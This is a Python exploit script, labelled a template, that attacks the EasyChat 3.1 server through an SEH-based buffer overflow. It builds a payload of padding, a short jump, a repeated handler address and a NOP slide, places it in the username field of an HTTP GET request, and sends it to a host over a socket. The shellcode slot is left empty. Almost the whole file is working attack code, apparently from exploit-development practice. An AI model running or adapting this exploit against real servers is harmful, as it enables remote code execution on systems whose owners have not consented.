#!/usr/bin/env python

#####################################
# EasyChat 3.1 SEH Exploit Template
# Author: Ted Tagami
#####################################

from pwn import *

host = "chat.net"
port = 80

shell = ""
buff = b"A" * 217 + b"\xEB\x42\xCC\xCC" + b"\x7e\x8d\x01\x10"*16 + b"\x90" * 8 + shell

payload = b"GET /chat.ghp?username=" + buff + b"&password=rwar&room=1&sex=2 HTTP/1.0\r\n"
payload += b"Host: chat.net\n"
payload += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n>"
payload += b"Accept-Language: en-US,en;q=0.5\n"
payload += b"Accept-Encoding: gzip, deflate\n"
payload += b"Referer: http://chat.net/\n"
payload += b"DNT: 1\n"
payload += b"Connection: keep-alive\n"
payload += b"Upgrade-Insecure-Requests: 1\n"
payload += b"Cache-Control: max-age=0\n"
payload += b"\r\n\r\n"

s = socket.socket()
s.connect((host, port))
s.send(payload)
